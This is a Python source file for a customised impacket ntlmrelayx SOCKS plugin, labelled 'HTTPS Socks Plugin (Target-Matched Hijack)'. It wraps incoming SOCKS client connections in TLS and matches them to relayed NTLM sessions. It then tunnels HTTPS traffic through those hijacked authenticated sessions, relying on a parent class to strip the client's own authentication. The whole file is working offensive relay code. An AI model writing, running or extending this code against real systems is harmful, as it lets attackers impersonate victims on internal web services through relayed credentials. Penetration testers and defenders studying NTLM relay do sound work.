from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksplugins.http import HTTPSocksRelay
from impacket.examples.ntlmrelayx.utils.ssl import SSLServerMixin
from OpenSSL import SSL

PLUGIN_CLASS = "HTTPSSocksRelay"
EOL = b'\r\n'

class HTTPSSocksRelay(SSLServerMixin, HTTPSocksRelay):
    PLUGIN_NAME = 'HTTPS Socks Plugin (Target-Matched Hijack)'
    PLUGIN_SCHEME = 'HTTPS'

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        HTTPSocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)

    @staticmethod
    def getProtocolPort():
        return 443

    def skipAuthentication(self):
        LOG.debug('Wrapping client connection in TLS/SSL')
        
        # 1. Wrap the incoming SOCKS connection from your C# client in TLS
        self.wrapClientConnection()
        
        # 2. Call the parent HTTP class we just rewrote. 
        # It will use our new matching logic, but look for 'HTTPS' targets!
        if not HTTPSocksRelay.skipAuthentication(self):
            # Shut down TLS connection gracefully if hijack fails
            try:
                self.socksSocket.shutdown()
            except Exception:
                pass
            return False
            
        return True

    def tunnelConnection(self):
        # This loop handles the HTTPS traffic after skipAuthentication succeeds.
        while True:
            try:
                data = self.socksSocket.recv(self.packetSize)
                if not data:
                    return
            except SSL.ZeroReturnError:
                # The SSL connection was closed cleanly by the client
                return
            except Exception as e:
                LOG.debug('HTTPS Socks Tunnel Error: %s' % str(e))
                return

            # Pass the request to the server (uses the parent's prepareRequest to strip auth)
            tosend = self.prepareRequest(data)
            self.relaySocket.send(tosend)
            
            # Send the response back to the client
            self.transferResponse()